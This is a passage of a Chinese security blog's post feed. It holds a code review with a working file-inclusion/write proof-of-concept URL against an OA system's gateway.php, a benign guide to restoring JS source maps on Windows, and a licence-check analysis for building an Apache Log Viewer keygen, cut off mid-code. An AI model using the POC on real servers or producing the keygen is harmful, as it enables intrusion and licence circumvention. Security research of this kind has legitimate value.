class="line">session_start();</span><br><span class="line">session_write_close();</span><br><span class="line"><span class="keyword">if</span> (($_SESSION[<span class="string">"LOGIN_USER_ID"</span>] == <span class="string">""</span>) || ($_SESSION[<span class="string">"LOGIN_UID"</span>] == <span class="string">""</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"RELOGIN"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">$json = stripcslashes($json);</span><br><span class="line">$json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val ) &#123;</span><br><span class="line"><span class="keyword">if</span> ($key == <span class="string">"data"</span>) &#123;</span><br><span class="line">$val = (<span class="keyword">array</span>) $val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value ) &#123;</span><br><span class="line">$keys = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($key == <span class="string">"url"</span>) &#123;</span><br><span class="line">$url = $val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($url != <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span>) &#123;</span><br><span class="line">$url = substr($url, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="拿下2017的另一个思路"><a href="#拿下2017的另一个思路" class="headerlink" title="拿下2017的另一个思路"></a>拿下2017的另一个思路</h1><p>官方发布了任意文件上传的补丁，并且部分WAF拦截了形如<code>../../</code>跨目录方式，无法包含<code>nginx</code>日志，是否意味着无法用包含玩了呢？</p><p>通过一番寻找，发现了一处利用官方文件<strong>合法</strong>写入并包含的点</p><p>涉及到的文件路径<code>general/workflow/document_list/input_form/form6.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script type=\"text/javascript\" src=\"/inc/js/jquery/jquery.min.js.jz\"&gt;&lt;/script&gt;\r\n&lt;script&gt; \r\nfunction click_main_doc_op(op)\r\n&#123;\r\n\t   if(op == \"1\")\r\n\t   &#123;    \r\n\t\t $(\"tr_addfile\").style.display = '';    \r\n       &#125;else\r\n\t    &#123;\t \r\n\t\t $(\"tr_addfile\").style.display = 'none';    \r\n\t    &#125;\r\n&#125;\r\nfunction check()&#123;\r\n\talert();\r\n&#125;\r\n\r\n&lt;/script&gt;\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($MAINDOC_ID !== <span class="string">""</span>) &#123;</span><br><span class="line">file_put_contents(<span class="string">"29.txt"</span>, $MAINDOC_ID);</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"document_attach.php"</span>;</span><br><span class="line">$data .= ob_get_contents();</span><br><span class="line">ob_flush();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n\r\n\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;table class=\"TableBlock\" width=\"95%\" align=\"center\"&gt;\r\n  &lt;tr&gt;\r\n  \t&lt;td class=\"TableHeader\" colspan=\"2\"&gt;创建正文文件&lt;/b&gt;\r\n  &lt;/tr&gt;\r\n  &lt;/tr&gt;\r\n  &lt;tr id=\"maindoc\"&gt;\r\n  \t&lt;td class=\"TableData\" width=\"120\"&gt;&lt;b&gt;创建方式：&lt;/b&gt;&lt;/td&gt;\r\n  \t&lt;td class=\"TableData\"&gt;\r\n  \t   &lt;input type=\"radio\" name=\"MAIN_DOC_OP\" id=\"MAIN_DOC_OP_1\" value=\"1\" onclick=\"click_main_doc_op(this.value)\"&gt;&lt;label for=\"MAIN_DOC_OP_1\"&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"上传本地文件"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/label&gt;\r\n  \t   &lt;input type=\"radio\" name=\"MAIN_DOC_OP\" id=\"MAIN_DOC_OP_2\" value=\"2\" onclick=\"click_main_doc_op(this.value)\"&gt;&lt;label for=\"MAIN_DOC_OP_2\"&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"新建空文件"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/label&gt;\r\n        &lt;input type=\"button\"  id=\"MAIN_DOC_OP\" value=\"确定\" class=\"SmaillButton\" onclick=\"CheckForm(15);\" &gt;\r\n  \t&lt;/td&gt;\r\n  &lt;/tr&gt;\r\n  &lt;tr id=\"tr_addfile\" style=\"display:none;\"&gt;\r\n  \t&lt;td class=\"TableData\"&gt;&lt;b&gt;选择本地文件：&lt;/b&gt;&lt;/td&gt;\r\n  \t&lt;td class=\"TableData\" &gt;\r\n  \t   &lt;input type=\"file\" class=\"BigInput\" name=\"MAIN_DOC_FILE\" size=40&gt;\r\n  \t&lt;/td&gt;\r\n  &lt;/tr&gt;\r\n&lt;/table&gt;\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于这套程序存在变量覆盖，因此通过<code>gateway.php</code>包含该文件并传入<code>MAINDOC_ID</code>即可，POC：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;mac&#x2F;gateway.php?json&#x3D;&#123;&quot;url&quot;:&quot;..&#x2F;general&#x2F;workflow&#x2F;document_list&#x2F;input_form&#x2F;form6.php&quot;&#125;&amp;MAINDOC_ID&#x3D;PAYLOAD</span><br></pre></td></tr></table></figure><p>然后就会在<code>/mac</code>目录下生成<code>29.txt</code>，然后包含即可</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200321004604561.png" alt="image-20200321004604561"></p>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> CodeReview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>还原JS Map文件</title>
      <link href="/p/17ec.html"/>
      <url>/p/17ec.html</url>
      
        <content type="html"><![CDATA[<p>做项目时发现一个站点为前后分离的架构，翻了下发现了map文件，采用<code>restore-source-tree</code>还原时报错，记录下解决过程</p><a id="more"></a><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>先从git克隆到本地</p><p><code>git clone https://github.com/laysent/restore-source-tree.git</code></p><p>然后进入文件夹</p><p><code>npm install</code></p><p>这里建议挂个代理、VPN，国内很慢</p><p>这里在win下会报错</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">λ npm cinstall                                                                                                                                                            </span><br><span class="line">npm WARN deprecated babel-preset-es2015@6.24.1: �  Thanks for using Babel: we recommend using babel-preset-env now: please read https://babeljs.io/env to update!         </span><br><span class="line">npm WARN deprecated core-js@2.6.11: core-js@&lt;3 is no longer maintained and not recommended for usage due to the number of issues. Please, upgrade your dependencies to the</span><br><span class="line">ctual version of core-js@3.                                                                                                                                               </span><br><span class="line">npm WARN deprecated circular-json@0.3.3: CircularJSON is in maintenance only, flatted is its successor.                                                                   </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> core-js@2.6.11 postinstall C:\Users\Administrator\Desktop\qubu\restore-source-tree\node_modules\core-js                                                                 </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> node -e <span class="string">"try&#123;require('./postinstall')&#125;catch(e)&#123;&#125;"</span>                                                                                                                       </span></span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">Thank you for using core-js ( https://github.com/zloirock/core-js ) for polyfilling JavaScript standard library!                                                          </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">The project needs your help! Please consider supporting of core-js on Open Collective or Patreon:                                                                         </span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> https://opencollective.com/core-js                                                                                                                                      </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> https://www.patreon.com/zloirock                                                                                                                                        </span></span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">Also, the author of core-js ( https://github.com/zloirock ) is looking for a good job -)                                                                                  </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">npm WARN prepublish-on-install As of npm@5, `prepublish` scripts are deprecated.                                                                                          </span><br><span class="line">npm WARN prepublish-on-install Use `prepare` for build steps and `prepublishOnly` for upload-only.                                                                        </span><br><span class="line">npm WARN prepublish-on-install See the deprecation note in `npm help scripts` for more information.                                                                       </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> restore-source-tree@0.1.1 prepublish C:\Users\Administrator\Desktop\qubu\restore-source-tree                                                                            </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> npm run build                                                                                                                                                           </span></span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> restore-source-tree@0.1.1 build C:\Users\Administrator\Desktop\qubu\restore-source-tree                                                                                 </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> NODE_ENV=production babel index.js --out-file dist.js                                                                                                                   </span></span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">'NODE_ENV' is not recognized as an internal or external command,                                                                                                          </span><br><span class="line">operable program or batch file.                                                                                                                                           </span><br><span class="line">npm ERR! code ELIFECYCLE                                                                                                                                                  </span><br><span class="line">npm ERR! errno 1                                                                                                                                                          </span><br><span class="line">npm ERR! restore-source-tree@0.1.1 build: `NODE_ENV=production babel index.js --out-file dist.js`                                                                         </span><br><span class="line">npm ERR! Exit status 1                                                                                                                                                    </span><br><span class="line">npm ERR!                                                                                                                                                                  </span><br><span class="line">npm ERR! Failed at the restore-source-tree@0.1.1 build script.                                                                                                            </span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.                                                                        </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">npm ERR! A complete log of this run can be found in:                                                                                                                      </span><br><span class="line">npm ERR!     C:\Users\Administrator\AppData\Roaming\npm-cache\_logs\2020-03-13T08_30_28_330Z-debug.log                                                                    </span><br><span class="line">npm ERR! code ELIFECYCLE                                                                                                                                                  </span><br><span class="line">npm ERR! errno 1                                                                                                                                                          </span><br><span class="line">npm ERR! restore-source-tree@0.1.1 prepublish: `npm run build`                                                                                                            </span><br><span class="line">npm ERR! Exit status 1                                                                                                                                                    </span><br><span class="line">npm ERR!                                                                                                                                                                  </span><br><span class="line">npm ERR! Failed at the restore-source-tree@0.1.1 prepublish script.                                                                                                       </span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.                                                                        </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">npm ERR! A complete log of this run can be found in:                                                                                                                      </span><br><span class="line">npm ERR!     C:\Users\Administrator\AppData\Roaming\npm-cache\_logs\2020-03-13T08_30_28_406Z-debug.log</span><br></pre></td></tr></table></figure><p><code>&#39;NODE_ENV&#39; is not recognized as an internal or external command,operable program or batch file.</code></p><p>跨平台缘故，<code>NODE_ENV</code>为<code>*nix</code>环境变量，安装<code>cross-env</code>包然后修改</p><p><code>npm install -g cross-env</code></p><p>目录下面的<code>package.json</code>中的<code>&quot;build&quot;: &quot;NODE_ENV=production babel index.js --out-file dist.js&quot;,</code>为<code>&quot;build&quot;: &quot;cross-env NODE_ENV=production babel index.js --out-file dist.js&quot;,</code></p><p>修改后完整如下</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"restore-source-tree"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"0.1.1"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"Restores file structure from source map"</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"dist.js"</span>,</span><br><span class="line">  <span class="attr">"bin"</span>: &#123;</span><br><span class="line">    <span class="attr">"restore-source-tree"</span>: <span class="string">"bin/restore-source-tree.js"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,</span><br><span class="line">    <span class="attr">"build"</span>: <span class="string">"cross-env NODE_ENV=production babel index.js --out-file dist.js"</span>,</span><br><span class="line">    <span class="attr">"prepublish"</span>: <span class="string">"npm run build"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">"Alexander &lt;alexkuz@gmail.com&gt; (http://kuzya.org/)"</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"commander"</span>: <span class="string">"^2.9.0"</span>,</span><br><span class="line">    <span class="attr">"glob"</span>: <span class="string">"^7.1.3"</span>,</span><br><span class="line">    <span class="attr">"minimist"</span>: <span class="string">"^1.2.0"</span>,</span><br><span class="line">    <span class="attr">"mkdirp"</span>: <span class="string">"^0.5.1"</span>,</span><br><span class="line">    <span class="attr">"source-map"</span>: <span class="string">"^0.5.6"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"babel-cli"</span>: <span class="string">"^6.11.4"</span>,</span><br><span class="line">    <span class="attr">"babel-eslint"</span>: <span class="string">"^6.1.2"</span>,</span><br><span class="line">    <span class="attr">"babel-preset-es2015"</span>: <span class="string">"^6.9.0"</span>,</span><br><span class="line">    <span class="attr">"babel-preset-stage-0"</span>: <span class="string">"^6.5.0"</span>,</span><br><span class="line">    <span class="attr">"eslint"</span>: <span class="string">"^3.1.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行<code>npm install</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm WARN prepublish-on-install As of npm@5, `prepublish` scripts are deprecated.</span><br><span class="line">npm WARN prepublish-on-install Use `prepare` for build steps and `prepublishOnly` for upload-only.</span><br><span class="line">npm WARN prepublish-on-install See the deprecation note in `npm help scripts` for more information.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> restore-source-tree@0.1.1 prepublish C:\Users\Administrator\Desktop\qubu\restore-source-tree</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> npm run build</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> restore-source-tree@0.1.1 build C:\Users\Administrator\Desktop\qubu\restore-source-tree</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> cross-env NODE_ENV=production babel index.js --out-file dist.js</span></span><br><span class="line"></span><br><span class="line">npm notice created a lockfile as package-lock.json. You should commit this file.</span><br><span class="line">npm WARN restore-source-tree@0.1.1 No repository field.</span><br><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.11 (node_modules\fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.11: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"win32","arch":"x64"&#125;)</span><br><span class="line"></span><br><span class="line">audited 4406 packages in 16.868s</span><br><span class="line"></span><br><span class="line">3 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 1 low severity vulnerability</span><br><span class="line">  run `npm audit fix` to fix them, or `npm audit` for details</span><br></pre></td></tr></table></figure><p>编译成功，<code>restore-source-tree</code>整体拷贝到<code>C:\Users\Administrator\AppData\Roaming\npm\node_modules\restore-source-tree</code>即可使用</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200313170912252.png" alt="image-20200313170912252"></p><h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><p>Windows平台不允许路径、文件中含有<code>?</code>等特殊字符，修改<code>dist.js</code>中101行前后为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="number">0</span>, _mkdirp2.default)(dir, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">'Failed creating directory'</span>, dir);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    outPath=outPath.replace(<span class="string">'?'</span>,<span class="string">'_'</span>);<span class="comment">//替换特殊字符</span></span><br><span class="line">    _fs2.default.writeFile(outPath, content, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'Failed writing file'</span>, outPath);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>修改前</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200313171223971.png" alt="image-20200313171223971"></p><p>修改后</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200313171232939.png" alt="image-20200313171232939"></p><p>代码也正常还原了</p><p><img src= "/img/loading.gif" data-lazy-src="/images/image-20200313171253553.png" alt="image-20200313171253553"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log Viewer 5.X 注册机</title>
      <link href="/p/a73d.html"/>
      <url>/p/a73d.html</url>
      
        <content type="html"><![CDATA[<p>抽空研究了下<code>ALV</code>的注册机制，写了个注册机</p><a id="more"></a><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>ALV的注册方法是<code>unlockCodeToolStripMenuItem_Click</code>方法，当点击<code>Unlock</code>按钮时会触发注册事件并调用<code>Class2</code>类中的<code>smethod_1</code>、<code>smethod_0</code>2个方法进行校验，详细流程见如下代码</p><p><code>unlockCodeToolStripMenuItem_Click</code>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlockCodeToolStripMenuItem_Click</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">string</span> text = <span class="keyword">this</span>.prefs_0.Key;</span><br><span class="line"><span class="keyword">if</span> (!InputForm.smethod_3(<span class="string">"Apache Logs Viewer | "</span> + Class96.smethod_264(), Class96.smethod_143(), <span class="keyword">ref</span> text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (text != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = text.Trim();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">string</span>.IsNullOrEmpty(text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = <span class="keyword">string</span>.Empty;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.WaitCursor;</span><br><span class="line"><span class="keyword">if</span> (text.Length &lt; <span class="number">22</span>)<span class="comment">//检查key长度是否大于22</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">"Failed"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class2.smethod_1(Class2.smethod_0(text)))<span class="comment">//重点位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = text;</span><br><span class="line"><span class="keyword">this</span>.method_23();</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_253() + <span class="string">" Apache Logs Viewer."</span>;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_253() + <span class="string">" Apache Logs Viewer."</span>, <span class="string">"Apache Logs Viewer"</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_117(), <span class="string">"Apache Logs Viewer | "</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_90(), <span class="string">"Apache Logs Viewer | "</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Class2.smethod_0</code>方法，</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">smethod_0</span>(<span class="params"><span class="keyword">string</span> string_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (string_0.IndexOf(<span class="string">'-'</span>) &lt; <span class="number">0</span>)<span class="comment">//检查注册代码中是否有-</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> string_0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span> str = <span class="string">"DBV"</span>;</span><br><span class="line">string_0 = string_0.Replace(<span class="string">"-"</span>, <span class="keyword">string</span>.Empty);<span class="comment">//将字符-转为空</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'Q'</span>, <span class="string">'4'</span>);<span class="comment">//Q转为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'G'</span>, <span class="string">'4'</span>);<span class="comment">//G转为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'V'</span>, <span class="string">'0'</span>);<span class="comment">//V转为0</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">'N'</span>, <span class="string">'3'</span>);<span class="comment">//N转为3</span></span><br><span class="line">str + string_0;<span class="comment">//无用语句</span></span><br><span class="line"><span class="keyword">byte</span>[] array = <span class="keyword">new</span> <span class="keyword">byte</span>[string_0.Length / <span class="number">2</span>];<span class="comment">//新建个数组，长度是去掉-后的注册码长度的一半</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; string_0.Length; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">byte</span> b;</span><br><span class="line"><span class="keyword">byte</span>.TryParse(<span class="keyword">new</span> <span class="keyword">string</span>(<span class="keyword">new</span> <span class="keyword">char</span>[]</span><br><span class="line">&#123;</span><br><span class="line">string_0[i],</span><br><span class="line">string_0[i + <span class="number">1</span>]</span><br><span class="line">&#125;), NumberStyles.HexNumber, CultureInfo.InvariantCulture, <span class="keyword">out</span> b);<span class="comment">//每两位进行拼接并转回字符串形式并依次存入b</span></span><br><span class="line">array[i / <span class="number">2</span>] = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span> text = Encoding.ASCII.GetString(array);<span class="comment">//将注册码转为字符串形式，传入的注册码为hex后的ascii值</span></span><br><span class="line">text = text.Insert(<span class="number">1</span>, <span class="string">":"</span>);<span class="comment">//第2位插入：</span></span><br><span class="line">text = text.Insert(<span class="number">5</span>, <span class="string">":"</span>);<span class="comment">//第6位插入：</span></span><br><span class="line">text = text.Insert(<span class="number">9</span>, <span class="string">":"</span>);<span class="comment">//第10位插入：</span></span><br><span class="line"><span class="keyword">if</span> (text.Length &gt; <span class="number">13</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = text.Insert(<span class="number">13</span>, <span class="string">":"</span>);<span class="comment">//如果注册码长度大于13则在第13位插入：</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Class2.smethod_1</code>方法，</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">smethod_1</span>(<span class="params"><span class="keyword">string</span> string_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">string</span> a = string_0.Substring(<span class="number">4</span>, <span class="number">5</span>);<span class="comment">//取经过smethod_0处理后的字符串中的第4到8位</span></span><br><span class="line">    <span class="comment">//如果a为IALV或注册码第一位不为F或第3位转为int型大于16或a不为I:ALV或注册码第4位转为int型大于16则抛出注册码错误</span></span><br><span class="line"><span class="keyword">if</span> (a == <span class="string">"IALV"</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (string_0[<span class="number">0</span>] != <span class="string">'F'</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num = <span class="keyword">int</span>.Parse(string_0[<span class="number">2</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a != <span class="string">"I:ALV"</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">num = <span class="keyword">int</span>.Parse(string_0[<span class="number">3</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">int</span>.TryParse(string_0.Substring(<span class="number">10</span>, <span class="number">3</span>), <span class="keyword">out</span> num))</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//处理后的注册码如果长度小于14则抛错</span></span><br><span class="line"><span class="keyword">if</span> (string_0.Length &lt;= <span class="number">14</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">"Invalid Unlock Code"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//命名num2变量，值为注册码的第15位，并判断num2是否为2或3，不是就抛错</span></span><br><span class="line"><span class="keyword">int</span> num2 = <span class="keyword">int</span>.Parse(string_0.Substring(<span class="number">15</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> (num2 != <span class="number">2</span> &amp;&amp; num2 != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">"Incorrect Code for Version"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span> s = string_0.Substring(<span class="number">0</span>, <span class="number">16</span>);<span class="comment">//s为1~17位</span></span><br><span class="line"><span class="keyword">string</span> b = string_0.Substring(<span class="number">16</span>);<span class="comment">//b为17位后的校验位</span></span><br><span class="line"><span class="keyword">int</span> num3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">byte</span>[] bytes = 